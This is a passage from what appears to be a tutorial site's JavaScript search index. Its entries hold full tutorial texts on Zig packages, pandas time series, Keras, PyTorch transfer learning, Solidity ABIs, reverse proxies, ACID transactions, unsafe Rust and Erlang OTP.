Use Infrastructure as Code (IaC) tools like Terraform, AWS CloudFormation, or Azure Resource Manager to automate the provisioning and management of cloud resources. Ensure Security: Implement robust security practices, including encryption, IAM, network security, and regular security audits. Optimize Costs: Regularly review your cloud usage and optimize costs by using reserved instances, spot instances, and right-sizing your resources. Monitor Performance: Continuously monitor the performance of your cloud infrastructure and applications to identify and resolve issues promptly. Plan for Disaster Recovery: Implement disaster recovery and backup strategies to ensure business continuity in the event of a failure or disaster. Conclusion linkCloud services play a vital role in modern technical architecture by providing flexibility, scalability, and cost-efficiency. By leveraging the offerings of major cloud providers like AWS, Azure, and GCP, businesses can build robust and resilient systems that meet their evolving needs. Implementing best practices and continuously optimizing your cloud architecture will ensure that you maximize the benefits of cloud computing while maintaining security, performance, and cost-efficiency.\n"
            }
        );
    index.add(
            {
                id:  236 ,
                href: "\/tutorials\/docs\/zig\/zig\/using_external_packages_with_zig\/",
                title: "Third Party Dependencies in Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Zig’s built-in package manager is relatively new and, as a consequence, has a number of rough edges. While there is room for improvements, it’s usable as is. There are two parts we need to look at: creating a package and using packages. We’ll go through this in full.\nFirst, create a new folder named calc and create three files. The first is add.zig, with the following content:\n// Oh, a hidden lesson, look at the type of b // and the return type!! pub fn add(a: anytype, b: @TypeOf(a)) @TypeOf(a) { return a + b; } const testing = @import(\"std\").testing; test \"add\" { try testing.expectEqual(@as(i32, 32), add(30, 2)); } It’s a bit silly, a whole package just to add two values, but it will let us focus on the packaging aspect. Next we’ll add an equally silly: calc.zig:\npub const add = @import(\"add.zig\").add; test { // By default, only tests in the specified file // are included. This magic line of code will // cause a reference to all nested containers // to be tested. @import(\"std\").testing.refAllDecls(@This()); } We’re splitting this up between calc.zig and add.zig to prove that zig build will automatically build and package all of our project files. Finally, we can add a build.zig:\nconst std = @import(\"std\"); pub fn build(b: *std.Build) !void { const target = b.standardTargetOptions(.{}); const optimize = b.standardOptimizeOption(.{}); const tests = b.addTest(.{ .target = target, .optimize = optimize, .root_source_file = b.path(\"calc.zig\"), }); const test_cmd = b.addRunArtifact(tests); test_cmd.step.dependOn(b.getInstallStep()); const test_step = b.step(\"test\", \"Run the tests\"); test_step.dependOn(\u0026test_cmd.step); } This is all a repetition of what we saw in the previous section. With this, you can run zig build test –summary all.\nBack to our learning project and our previously created build.zig. We’ll begin by adding our local calc as a dependency. We need to make three additions. First, we’ll create a module pointing to our calc.zig:\n// You can put this near the top of the build // function, before the call to addExecutable. const calc_module = b.addModule(\"calc\", .{ .root_source_file = b.path(\"PATH_TO_CALC_PROJECT/calc.zig\"), }); You’ll need to adjust the path to calc.zig. We now need to add this module to both our existing exe and tests variables. Since our build.zig is getting busier, we’ll try to organize things a little:\nconst std = @import(\"std\"); pub fn build(b: *std.Build) !void { const target = b.standardTargetOptions(.{}); const optimize = b.standardOptimizeOption(.{}); const calc_module = b.addModule(\"calc\", .{ .root_source_file = b.path(\"PATH_TO_CALC_PROJECT/calc.zig\"), }); { // setup our \"run\" cmmand const exe = b.addExecutable(.{ .name = \"learning\", .target = target, .optimize = optimize, .root_source_file = b.path(\"learning.zig\"), }); // add this exe.root_module.addImport(\"calc\", calc_module); b.installArtifact(exe); const run_cmd = b.addRunArtifact(exe); run_cmd.step.dependOn(b.getInstallStep()); const run_step = b.step(\"run\", \"Start learning!\"); run_step.dependOn(\u0026run_cmd.step); } { // setup our \"test\" command const tests = b.addTest(.{ .target = target, .optimize = optimize, .root_source_file = b.path(\"learning.zig\"), }); // add this tests.root_module.addImport(\"calc\", calc_module); const test_cmd = b.addRunArtifact(tests); test_cmd.step.dependOn(b.getInstallStep()); const test_step = b.step(\"test\", \"Run the tests\"); test_step.dependOn(\u0026test_cmd.step); } } From within your project, you’re now able to @import(“calc”):\nconst calc = @import(\"calc\"); ... calc.add(1, 2); Adding a remote dependency takes a bit more effort. First, we need to go back to the calc project and define a module. You might think that the project itself is a module, but a project can expose multiple modules, so we need to explicitly create it. We use the same addModule, but discard the return value. Simply calling addModule is enough to define the module which other projects will then be able to import.\n_ = b.addModule(\"calc\", .{ .root_source_file = b.path(\"calc.zig\"), }); This is the only change we need to make to our library. Because this is an exercise in having a remote dependency, I’ve pushed this calc project to Github so that we can import it into our learning project. It’s available at https://github.com/karlseguin/calc.zig.\nBack in our learning project, we need a new file, build.zig.zon. “ZON” stands for Zig Object Notation and it allows Zig data to be expressed in a human readable format, and for that human readable format to be turned into Zig code. The contents of the build.zig.zon will be:\n.{ .name = \"learning\", .paths = .{\"\"}, .version = \"0.0.0\", .dependencies = .{ .calc = .{ .url = \"https://github.com/karlseguin/calc.zig/archive/d1881b689817264a5644b4d6928c73df8cf2b193.tar.gz\", .hash = \"12ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\" }, }, } There are two questionable values in this file, the first is d1881b689817264a5644b4d6928c73df8cf2b193 within the url. This is simply the git commit hash. The second is the value of hash. As far as I know, there’s currently no great way to tell what this value should be, so we use a dummy value for the time being.\nTo use this dependency, we need to make one change to our build.zig:\n// replace this: const calc_module = b.addModule(\"calc\", .{ .root_source_file = b.path(\"calc/calc.zig\"), }); // with this: const calc_dep = b.dependency(\"calc\", .{.target = target,.optimize = optimize}); const calc_module = calc_dep.module(\"calc\"); In build.zig.zon we named the dependency calc, and that’s the dependency that we’re loading here. From within this dependency, we’re grabbing the calc module, which is what we named the module in calc’s build.zig.\nIf you try to run zig build test, you should see an error:\nhash mismatch: manifest declares 122053da05e0c9348d91218ef015c8307749ef39f8e90c208a186e5f444e818672da but the fetched package has 122036b1948caa15c2c9054286b3057877f7b152a5102c9262511bf89554dc836ee5 Copy and paste the correct hash back into the build.zig.zon and try running zig build test again. Everything should now be working.\nIt sounds like a lot, and I hope things get streamlined. But it’s mostly something you can copy and paste from other projects and, once setup, you can move on.\nA word of warning, I’ve found Zig’s caching of dependencies to be on the aggressive side. If you try to update a dependency but Zig doesn’t seem to detect the change…well, I nuke the project’s zig-cache folder as well as ~/.cache/zig.\n"
            }
        );
    index.add(
            {
                id:  237 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/introduction_to_time_series\/",
                title: "Time Series Analysis with Pandas",
                description: "In this section, you will be learning more about Dataframes, how to load data into one and how to perform operations.",
                content: "Time Series Analysis with Pandas linkTime series data is ubiquitous in many fields, such as finance, economics, environmental science, and engineering. Pandas provides powerful tools to handle, analyze, and visualize time series data effectively. This tutorial will cover:\nCreating and manipulating time series data Resampling and frequency conversion Time-based indexing and slicing Rolling and expanding windows Time series visualization Creating Time Series Data linkWe’ll start by creating a sample time series DataFrame to demonstrate these concepts.\nCreating a Date Range link import pandas as pd import numpy as np # Creating a date range date_range = pd.date_range(start='2023-01-01', periods=100, freq='D') print(\"Date Range:\") print(date_range) Creating a Time Series DataFrame link # Creating a DataFrame with the date range as the index data = np.random.randn(100) df = pd.DataFrame(data, index=date_range, columns=['Value']) print(\"\\nTime Series DataFrame:\") print(df.head()) Resampling and Frequency Conversion linkResampling involves changing the frequency of your time series observations. This can be useful for down-sampling (reducing the frequency) or up-sampling (increasing the frequency).\nDown-sampling link # Down-sampling to monthly frequency monthly_df = df.resample('M').mean() print(\"\\nDown-sampled to Monthly Frequency:\") print(monthly_df) Up-sampling link # Up-sampling to hourly frequency and filling missing values with the previous value hourly_df = df.resample('H').ffill() print(\"\\nUp-sampled to Hourly Frequency:\") print(hourly_df.head()) Time-based Indexing and Slicing linkTime-based indexing and slicing allow you to access specific subsets of your time series data based on time criteria.\nIndexing link # Accessing data for a specific date specific_date = df.loc['2023-02-01'] print(\"\\nData for 2023-02-01:\") print(specific_date) Slicing link # Slicing data for a specific date range date_range_slice = df.loc['2023-02-01':'2023-02-10'] print(\"\\nData from 2023-02-01 to 2023-02-10:\") print(date_range_slice) Rolling and Expanding Windows linkRolling and expanding windows provide methods to calculate statistics over a sliding window or an expanding window.\nRolling Window link # Calculating the rolling mean with a window of 7 days rolling_mean = df.rolling(window=7).mean() print(\"\\nRolling Mean with a Window of 7 Days:\") print(rolling_mean.head(10)) Expanding Window link # Calculating the expanding mean expanding_mean = df.expanding().mean() print(\"\\nExpanding Mean:\") print(expanding_mean.head(10)) Time Series Visualization linkVisualizing time series data is crucial for understanding trends, patterns, and anomalies.\nPlotting Time Series Data link import matplotlib.pyplot as plt # Plotting the original time series data df.plot(title='Original Time Series Data') plt.show() # Plotting the rolling mean rolling_mean.plot(title='Rolling Mean with a Window of 7 Days') plt.show() # Plotting the expanding mean expanding_mean.plot(title='Expanding Mean') plt.show() # Plotting the down-sampled data monthly_df.plot(title='Monthly Mean') plt.show() This tutorial provides a comprehensive introduction to time series analysis using Pandas, demonstrating how to create, manipulate, and visualize time series data effectively. By mastering these techniques, you can leverage the power of Pandas to perform advanced time series analysis and gain valuable insights from your data.\n"
            }
        );
    index.add(
            {
                id:  238 ,
                href: "\/tutorials\/docs\/keras\/keras\/training_models_on_arbitrary_data_sources\/",
                title: "Training models on arbitrary data sources",
                description: "All Keras models can be trained and evaluated on a wide variety of data sources, independently of the backend you're using.",
                content: "All Keras models can be trained and evaluated on a wide variety of data sources, independently of the backend you’re using. This includes:\nNumPy arrays Pandas dataframes TensorFlow tf.data.Dataset objects PyTorch DataLoader objects Keras PyDataset objects They all work whether you’re using TensorFlow, JAX, or PyTorch as your Keras backend.\nLet’s try it out with PyTorch DataLoaders:\nimport torch # Create a TensorDataset train_torch_dataset = torch.utils.data.TensorDataset( torch.from_numpy(x_train), torch.from_numpy(y_train) ) val_torch_dataset = torch.utils.data.TensorDataset( torch.from_numpy(x_test), torch.from_numpy(y_test) ) # Create a DataLoader train_dataloader = torch.utils.data.DataLoader( train_torch_dataset, batch_size=batch_size, shuffle=True ) val_dataloader = torch.utils.data.DataLoader( val_torch_dataset, batch_size=batch_size, shuffle=False ) model = MyModel(num_classes=10) model.compile( loss=keras.losses.SparseCategoricalCrossentropy(), optimizer=keras.optimizers.Adam(learning_rate=1e-3), metrics=[ keras.metrics.SparseCategoricalAccuracy(name=\"acc\"), ], ) model.fit(train_dataloader, epochs=1, validation_data=val_dataloader) 469/469 ━━━━━━━━━━━━━━━━━━━━ 81s 172ms/step - acc: 0.5502 - loss: 1.2550 - val_acc: 0.9419 - val_loss: 0.1972 Now let’s try this out with tf.data:\nimport tensorflow as tf train_dataset = ( tf.data.Dataset.from_tensor_slices((x_train, y_train)) .batch(batch_size) .prefetch(tf.data.AUTOTUNE) ) test_dataset = ( tf.data.Dataset.from_tensor_slices((x_test, y_test)) .batch(batch_size) .prefetch(tf.data.AUTOTUNE) ) model = MyModel(num_classes=10) model.compile( loss=keras.losses.SparseCategoricalCrossentropy(), optimizer=keras.optimizers.Adam(learning_rate=1e-3), metrics=[ keras.metrics.SparseCategoricalAccuracy(name=\"acc\"), ], ) model.fit(train_dataset, epochs=1, validation_data=test_dataset) 469/469 ━━━━━━━━━━━━━━━━━━━━ 81s 172ms/step - acc: 0.5771 - loss: 1.1948 - val_acc: 0.9229 - val_loss: 0.2502 "
            }
        );
    index.add(
            {
                id:  239 ,
                href: "\/tutorials\/docs\/pytorch\/pytorch\/transfer_learning\/",
                title: "Transferr Learning in Pytorch",
                description: "A comprehensive introduction to PyTorch for deep learning.",
                content: "Transfer Learning with PyTorch: Enhancing Your Classification Model linkWhat is Transfer Learning? linkTransfer learning allows us to leverage pre-trained models, using the patterns and knowledge they have acquired from large datasets to solve new, but related, problems. This technique is highly valuable in scenarios where acquiring a massive dataset or training a model from scratch is impractical.\nWhy Use Transfer Learning? link Leverage Existing Models: Use neural network architectures that are already proven to work on similar problems. Efficiency: Achieve better results with less data and computational resources by building on models that have already learned useful patterns. Setting Up Transfer Learning with PyTorch linkLet’s dive into the practical steps to set up a transfer learning workflow using PyTorch, focusing on an image classification task with FoodVision Mini (pizza, steak, sushi).\n0. Setup linkEnsure you have the necessary libraries and modules. We’ll also download required scripts and data.\n# Imports and setup import torch import torchvision from torch import nn from torchvision import transforms try: from torchinfo import summary except ImportError: !pip install torchinfo from torchinfo import summary # Download going_modular scripts try: from going_modular.going_modular import data_setup, engine except ImportError: !git clone https://github.com/mrdbourke/pytorch-deep-learning !mv pytorch-deep-learning/going_modular . !rm -rf pytorch-deep-learning from going_modular.going_modular import data_setup, engine # Setup device device = \"cuda\" if torch.cuda.is_available() else \"cpu\" 1. Get Data linkDownload and prepare the dataset.\nimport os import zipfile from pathlib import Path import requests # Setup data path data_path = Path(\"data/\") image_path = data_path / \"pizza_steak_sushi\" if not image_path.is_dir(): image_path.mkdir(parents=True, exist_ok=True) with open(data_path / \"pizza_steak_sushi.zip\", \"wb\") as f: request = requests.get(\"https://github.com/mrdbourke/pytorch-deep-learning/raw/main/data/pizza_steak_sushi.zip\") f.write(request.content) with zipfile.ZipFile(data_path / \"pizza_steak_sushi.zip\", \"r\") as zip_ref: zip_ref.extractall(image_path) os.remove(data_path / \"pizza_steak_sushi.zip\") train_dir = image_path / \"train\" test_dir = image_path / \"test\" 2. Create Datasets and DataLoaders linkWe need to prepare our data loaders with appropriate transformations.\n# Define manual transforms manual_transforms = transforms.Compose([ transforms.Resize((224, 224)), transforms.ToTensor(), transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]) ]) # Create DataLoaders train_dataloader, test_dataloader, class_names = data_setup.create_dataloaders( train_dir=train_dir, test_dir=test_dir, transform=manual_transforms, batch_size=32 ) 3. Load a Pretrained Model linkChoose a pretrained model and customize it for our dataset.\n# Load pretrained EfficientNet_B0 weights = torchvision.models.EfficientNet_B0_Weights.DEFAULT model = torchvision.models.efficientnet_b0(weights=weights).to(device) # Print model summary summary(model, input_size=(32, 3, 224, 224), col_names=[\"input_size\", \"output_size\", \"num_params\", \"trainable\"], col_width=20, row_settings=[\"var_names\"]) 4. Customize the Model linkFreeze the base layers and adjust the output layer for our specific task.\n# Freeze base layers for param in model.features.parameters(): param.requires_grad = False # Modify the classifier head model.classifier[1] = nn.Linear(in_features=model.classifier[1].in_features, out_features=len(class_names)).to(device) # Verify model changes summary(model, input_size=(32, 3, 224, 224), col_names=[\"input_size\", \"output_size\", \"num_params\", \"trainable\"], col_width=20, row_settings=[\"var_names\"]) 5. Train the Model linkUse a suitable optimizer and loss function, then train the model.\n# Set up loss function and optimizer loss_fn = nn.CrossEntropyLoss() optimizer = torch.optim.Adam(model.classifier.parameters(), lr=1e-3) # Train the model engine.train(model=model, train_dataloader=train_dataloader, test_dataloader=test_dataloader, optimizer=optimizer, loss_fn=loss_fn, epochs=5, device=device) Conclusion linkBy following these steps, you can effectively utilize transfer learning to boost your model’s performance with minimal data and effort. This technique not only saves time and resources but also leverages the power of pre-trained models to achieve superior results on custom tasks.\n"
            }
        );
    index.add(
            {
                id:  240 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/understanding_application_binary_interface\/",
                title: "Understandin Application Binary Interface (ABI) in Solidity",
                description: "Learn about ABIs in solidity and their uses.",
                content: "What is a Smart Contract ABI linkThe ABI, or “Application Binary Interface,” of a smart contract defines the standard way to interact with contracts in the Ethereum ecosystem. It allows both humans and machines to interact with contracts on the blockchain, facilitating both user-to-contract and contract-to-contract interactions.\nIn this section, you’ll learn what a smart contract ABI is and how to obtain it for interaction purposes.\nWhat does an ABI look like? linkConsider the following example of a simple smart contract:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; contract Counter { uint256 public number; function setNumber(uint256 newNumber) public { number = newNumber; } function increment() public { number++; } } When compiled and deployed, the readable Solidity code is converted into a hexadecimal string, which is what gets stored on the blockchain. This is where the ABI comes in, providing a human-readable way to interact with this hexadecimal data.\nThe ABI for the above contract looks like this:\n[ { \"type\": \"function\", \"name\": \"increment\", \"inputs\": [], \"outputs\": [], \"stateMutability\": \"nonpayable\" }, { \"type\": \"function\", \"name\": \"number\", \"inputs\": [], \"outputs\": [ { \"name\": \"\", \"type\": \"uint256\", \"internalType\": \"uint256\" } ], \"stateMutability\": \"view\" }, { \"type\": \"function\", \"name\": \"setNumber\", \"inputs\": [ { \"name\": \"newNumber\", \"type\": \"uint256\", \"internalType\": \"uint256\" } ], \"outputs\": [], \"stateMutability\": \"nonpayable\" } ] This JSON structure provides all the information needed to interact with the contract’s functions, such as their names, inputs, outputs, and state mutability.\nIs the ABI for humans or machines?\nThe ABI bridges the gap between human-readable code and machine-readable bytecode. It allows humans to understand how to interact with smart contracts and enables machines to convert human-readable function calls into executable bytecode.\nComponents of an ABI linkAn ABI includes several key pieces of information for each function within a smart contract:\nFunction Names: Identify the functions within the contract. Function Arguments: Detail the type, order, and data structure of inputs. Return Types: Specify the data type returned by the function. Events: Describe the events in the contract and their parameters. How to get a smart contract ABI linkYou can generate a smart contract ABI using various tools such as Remix, Foundry, and Hardhat. Most development frameworks will automatically create the ABI when you compile the smart contract.\nGet the smart contract ABI using Remix\nAfter compiling a smart contract in Remix, you can find an ABI copy button that allows you to easily obtain the ABI.\nGet the smart contract ABI using Foundry\nIn Foundry, after running forge build successfully, you can find the ABI in the compilation details located in the out folder.\nGet the smart contract ABI using Hardhat\nIn Hardhat, you can find the ABI in the artifacts/build-info folder after compiling the contract with npx hardhat compile.\nUsing a smart contract ABI on Solidity linkIn Solidity, you can use interfaces to provide the ABI implicitly. This helps the smart contract understand how to interact with another contract’s functions.\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface ICounter { function setNumber(uint256 newNumber) external; function increment() external; } With this interface, Solidity can generate the raw data needed to call the setNumber function of a Counter contract.\nICounter(counter_address).setNumber(8); Alternatively, you can call the function directly with raw data:\ncounter_address.call(0x3fb5c1cb0000000000000000000000000000000000000000000000000000000000000008); Using the smart contract ABI in JavaScript linkIn JavaScript, you use the ABI to interact with smart contracts via libraries like ethers.js. Here’s an example setup:\nconst { ethers } = require(\"ethers\"); const provider = new ethers.providers.JsonRpcProvider(); const counterAddress = \"0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045\"; const counterABI = [ { \"type\": \"function\", \"name\": \"increment\", \"inputs\": [], \"outputs\": [], \"stateMutability\": \"nonpayable\" }, { \"type\": \"function\", \"name\": \"number\", \"inputs\": [], \"outputs\": [ { \"name\": \"\", \"type\": \"uint256\", \"internalType\": \"uint256\" } ], \"stateMutability\": \"view\" }, { \"type\": \"function\", \"name\": \"setNumber\", \"inputs\": [ { \"name\": \"newNumber\", \"type\": \"uint256\", \"internalType\": \"uint256\" } ], \"outputs\": [], \"stateMutability\": \"nonpayable\" } ]; const counterContract = new ethers.Contract(counterAddress, counterABI, provider); async function setNumber() { await counterContract.setNumber(8); } By using the ABI, ethers.js converts the human-readable function call setNumber(8) into the raw hexadecimal data required by the smart contract.\nSummary: What is a Smart Contract ABI linkThe ABI, or “Application Binary Interface,” is a crucial component that allows humans and machines to encode and decode data for interacting with smart contracts. It simplifies the process of translating human-readable code into machine-readable bytecode and vice versa, making it easier to develop and interact with complex Ethereum-based applications.\n"
            }
        );
    index.add(
            {
                id:  241 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/reverse_proxies\/",
                title: "Understanding a Reverse Proxy??",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "A reverse proxy is a server that sits in front of web servers and forwards client requests to those web servers. Unlike a forward proxy, which sits in front of client machines and forwards client requests to the web servers, a reverse proxy serves as an intermediary for requests from clients seeking resources from one or more servers. It helps enhance security, performance, and reliability of the web services it supports.\nWhat is a Proxy Server? linkA forward proxy, often simply called a proxy, is a server that acts as an intermediary between a group of client machines and the wider internet. When these clients make requests to internet resources, the proxy intercepts these requests, processes them, and then forwards them to the appropriate web servers. The web servers’ responses are then sent back to the proxy, which forwards them to the clients.\nExample Scenario for Forward Proxy: link Computer A (Client): A user’s home computer. Computer B (Forward Proxy Server): The proxy server that intercepts and forwards requests. Computer C (Origin Server): The server where the website data is stored. In a typical forward proxy setup, the communication flow is:\nClient (A) sends a request to Forward Proxy (B). Forward Proxy (B) forwards the request to Origin Server (C). Origin Server (C) sends the response to Forward Proxy (B). Forward Proxy (B) sends the response back to Client (A). Uses of Forward Proxy: link Bypassing Restrictions: Users can access restricted content by connecting through a proxy that is not subject to the same restrictions. Content Filtering: Organizations can block access to certain websites or content types. Anonymity: Users can mask their IP addresses, making it harder to track their online activities. How is a Reverse Proxy Different? linkA reverse proxy sits in front of one or more web servers, intercepting requests from clients. Unlike a forward proxy, which handles requests from clients and forwards them to servers, a reverse proxy handles requests from clients on behalf of the servers, making it seem like the proxy server is the actual web server.\nExample Scenario for Reverse Proxy: link Computer D (Client): Any number of users’ home computers. Computer E (Reverse Proxy Server): The proxy server that intercepts and forwards requests. Computer F (Origin Server): One or more servers where the website data is stored. In a typical reverse proxy setup, the communication flow is:\nClient (D) sends a request to Reverse Proxy (E). Reverse Proxy (E) forwards the request to Origin Server (F). Origin Server (F) sends the response to Reverse Proxy (E). Reverse Proxy (E) sends the response back to Client (D). Benefits of a Reverse Proxy linkLoad Balancing linkA reverse proxy can distribute incoming traffic across multiple servers to ensure no single server becomes overwhelmed. This improves the performance and reliability of applications, particularly for high-traffic websites.\nProtection from Attacks linkBy hiding the IP addresses of origin servers, a reverse proxy can protect them from targeted attacks such as Distributed Denial of Service (DDoS) attacks. Attackers will only see the IP address of the reverse proxy, which typically has stronger security measures.\nGlobal Server Load Balancing (GSLB) linkA reverse proxy can distribute traffic across servers located in different geographical locations. Clients are directed to the nearest server, reducing latency and improving load times.\nCaching linkA reverse proxy can cache content, providing quicker responses to clients by serving cached data rather than fetching it from the origin server every time. This improves performance and reduces the load on origin servers.\nSSL Encryption linkReverse proxies can handle SSL encryption and decryption, offloading this resource-intensive task from the origin servers. This ensures secure data transmission while freeing up server resources for other tasks.\nImplementation of a Reverse Proxy linkBuilding a Reverse Proxy linkSome companies choose to build their own reverse proxies, which requires significant investment in software and hardware engineering resources, as well as physical infrastructure.\nUsing a CDN Service linkA cost-effective and efficient alternative is to use a Content Delivery Network (CDN) service. CDNs provide reverse proxy capabilities along with additional performance and security features. For example, Cloudflare’s CDN offers load balancing, DDoS protection, global server load balancing, caching, and SSL encryption, among other benefits.\nConclusion linkA reverse proxy serves as an intermediary between clients and servers, enhancing security, performance, and reliability. By managing traffic and providing features such as load balancing, caching, and SSL encryption, reverse proxies play a crucial role in modern web infrastructure. Whether built in-house or provided by a CDN, reverse proxies are essential for maintaining the efficiency and security of web applications.\n"
            }
        );
    index.add(
            {
                id:  242 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/acid_transactions\/",
                title: "Understanding ACID Transactions in Database Systems",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "In the realm of databases and data management, transactions play a pivotal role in ensuring data integrity and reliability. Whether you’re withdrawing money from a bank account or updating customer records in an e-commerce platform, transactions ensure that operations are executed in a dependable and secure manner. Central to the concept of transactions are the ACID properties — Atomicity, Consistency, Isolation, and Durability.\nWhat is a Transaction? linkA transaction refers to a sequence of operations performed as a single logical unit of work. This unit of work either executes completely, ensuring all operations within it are successful, or it fails entirely, leaving the system in a state as if no operations were performed. This ensures that data remains consistent and accurate, even in the event of system failures or errors.\nACID Properties Explained linkAtomicity linkAtomicity guarantees that each transaction is indivisible or “atomic”. This means that all operations within the transaction must be completed successfully for the transaction to be considered successful. If any part of the transaction fails, the entire transaction fails, and any changes made by the transaction are rolled back to maintain data integrity. For example, when transferring money between accounts, atomicity ensures that either the transfer completes successfully or it does not occur at all, preventing scenarios where money might be deducted from one account but not credited to another.\nConsistency linkConsistency ensures that the database remains in a consistent state before and after the transaction. Transactions must adhere to all defined rules and constraints, such as data validation rules, referential integrity, and constraints on attributes. This prevents any transaction from leaving the database in an inconsistent state, even in cases of unexpected failures or errors during execution.\nIsolation linkIsolation ensures that the concurrent execution of transactions does not interfere with each other. Even though multiple transactions may be executing simultaneously, each transaction appears to execute in isolation. Isolation levels define how transactions interact with each other, ensuring that one transaction’s intermediate state does not impact another transaction’s operation. This prevents issues such as dirty reads (reading uncommitted data), non-repeatable reads (seeing different results for the same query), and phantom reads (seeing different rows for the same query).\nDurability linkDurability guarantees that once a transaction has been committed, the changes it made to the database persist even in the face of system failures. This is typically achieved through mechanisms like write-ahead logging and database backups. Even if the system crashes immediately after a transaction is committed, upon recovery, the changes made by committed transactions will be reflected in the database. Durability ensures data reliability and recoverability, crucial for maintaining the overall integrity of the system.\nApplications of ACID Transactions linkACID transactions find applications across various domains, including financial transactions, e-commerce platforms, healthcare systems, and more. Any system where data consistency, reliability, and accuracy are paramount benefits from the use of ACID transactions. For instance, in online banking systems, ensuring that account balances are accurate and transactions are processed reliably is critical to maintaining customer trust and regulatory compliance.\nConclusion linkIn summary, ACID transactions provide a robust framework for ensuring data integrity and reliability in database systems. By adhering to the principles of Atomicity, Consistency, Isolation, and Durability, transactions guarantee that database operations are executed securely, even under challenging conditions. Understanding these ACID properties is essential for database designers, developers, and administrators to build and maintain systems that meet the highest standards of data reliability and consistency.\n"
            }
        );
    index.add(
            {
                id:  243 ,
                href: "\/tutorials\/docs\/rust\/rust\/understanding_using_unsafe_rust\/",
                title: "Understanding and Using Unsafe Rust",
                description: "Delve into the realm of Unsafe Rust with this in-depth guide, exploring the principles of `unsafe` code, its usage, and best practices. Learn technical details and practical strategies for when and how to responsibly incorporate `unsafe` Rust into your projects to manipulate low-level system details safely and efficiently.",
                content: "Introduction linkRust is renowned for its safety guarantees, but there are times when you might need to bypass these guarantees to directly interact with hardware or optimize performance. This post provides a comprehensive look at unsafe Rust, including what it entails, when it’s necessary, and how to use it without compromising the integrity of your applications.\nUnderstanding Unsafe Code linkUnsafe Rust refers to operations that can potentially violate the memory safety guarantees that Rust usually enforces. These operations are not checked by the Rust compiler’s borrow checker.\nCommon Uses of Unsafe Code:\nDereferencing Raw Pointers: Unlike regular references, raw pointers can be null or dangling. Calling Unsafe Functions: This includes functions from C libraries or Rust functions marked as unsafe. Accessing or Modifying Mutable Static Variables: Global variables in Rust can be mutable and accessed from multiple threads. Implementing Unsafe Traits: Certain traits can only be implemented safely with the guarantees provided by unsafe code. unsafe fn dangerous() {} fn main() { unsafe { dangerous(); } } This example demonstrates a simple unsafe function called within an unsafe block. The function does nothing in this case, but in real scenarios, it might perform operations that could lead to undefined behavior if misused.\nWhen and How to Use Unsafe linkUsing unsafe code is justified in several scenarios, primarily when interfacing with low-level system components, optimizing critical performance bottlenecks, or using externally maintained libraries written in other languages.\nGuidelines for Using Unsafe Code:\nMinimize the Use of Unsafe Blocks: Keep the unsafe code contained in small blocks to limit the potential for mistakes. Isolate Unsafe Code: Encapsulate unsafe code within safe abstractions whenever possible. Provide safe APIs to interact with the underlying unsafe operations. Document the Invariants: Clearly document the safety invariants that callers must adhere to for the unsafe operations to be safe. Audit and Review: Unsafe code should be reviewed more rigorously than safe code. Peer reviews can help catch subtle errors that might lead to security vulnerabilities. Example of Encapsulating Unsafe Code:\nmod sound { pub struct Waveform { data: Vec, sample_rate: usize, } impl Waveform { pub fn new(data: Vec, sample_rate: usize) -\u003e Self { Waveform { data, sample_rate } } pub unsafe fn buffer(\u0026self) -\u003e *const u8 { self.data.as_ptr() } } } fn main() { let wave = sound::Waveform::new(vec![0, 1, 2, 3], 44100); unsafe { let buffer_ptr = wave.buffer(); // Further unsafe code working with the buffer } } In this example, the buffer method is marked as unsafe because it returns a raw pointer to its internal data, which could lead to undefined behavior if mishandled. The unsafe behavior is encapsulated within a safe API (Waveform::new), and the unsafe method is clearly documented.\nConclusion linkUnsafe Rust allows you to perform low-level system programming tasks that are not possible under Rust’s strict safety constraints. By understanding when and how to use unsafe responsibly, you can extend the functionality of your Rust applications without sacrificing their integrity and security.\n"
            }
        );
    index.add(
            {
                id:  244 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/erlangs_otp\/",
                title: "Understanding Erlang's OTP Framework",
                description: "An in-depth guide to Erlang's Open Telecom Platform (OTP) framework.",
                content: "Understanding Erlang’s OTP Framework linkErlang’s Open Telecom Platform (OTP) framework is a set of libraries and design principles for building robust, fault-tolerant applications. OTP provides a solid foundation for building complex systems with high availability requirements, making it an essential tool for Erlang developers.\nWhat is OTP? linkOTP stands for Open Telecom Platform, and it is a collection of middleware, libraries, and tools designed to help developers create large-scale, reliable applications. It includes a set of design patterns, called behaviors, which abstract common functionalities and ensure best practices.\nCore Components of OTP linkOTP comprises several key components:\nSupervision Trees Generic Servers (gen_server) Finite State Machines (gen_fsm) Event Handlers (gen_event) Applications Supervision Trees linkSupervision trees are one of OTP’s fundamental concepts. A supervision tree is a hierarchical structure of processes where supervisors manage worker processes. Supervisors monitor their child processes and can restart them if they fail, ensuring system reliability and fault tolerance.\nCode Example: Supervisor\n-module(my_supervisor). -behaviour(supervisor). -export([start_link/0, init/1]). start_link() -\u003e supervisor:start_link({local, ?MODULE}, ?MODULE, []). init([]) -\u003e {ok, {{one_for_one, 5, 10}, [{my_worker, {my_worker, start_link, []}, permanent, 5000, worker, [my_worker]}]}}. Generic Servers (gen_server) linkThe gen_server behavior abstracts the common patterns of a server process. It simplifies the implementation of servers by handling standard functionalities like synchronous and asynchronous message handling, state management, and process lifecycle.\nCode Example: gen_server\n-module(my_server). -behaviour(gen_server). -export([start_link/0, init/1, handle_call/3, handle_cast/2, terminate/2, code_change/3]). start_link() -\u003e gen_server:start_link({local, ?MODULE}, ?MODULE, [], []). init([]) -\u003e {ok, #{}}. handle_call({add, X, Y}, _From, State) -\u003e {reply, X + Y, State}. handle_cast({set_value, Key, Value}, State) -\u003e {noreply, maps:put(Key, Value, State)}. terminate(_Reason, _State) -\u003e ok. code_change(_OldVsn, State, _Extra) -\u003e {ok, State}. Finite State Machines (gen_fsm) linkThe gen_fsm behavior is used to implement processes that follow 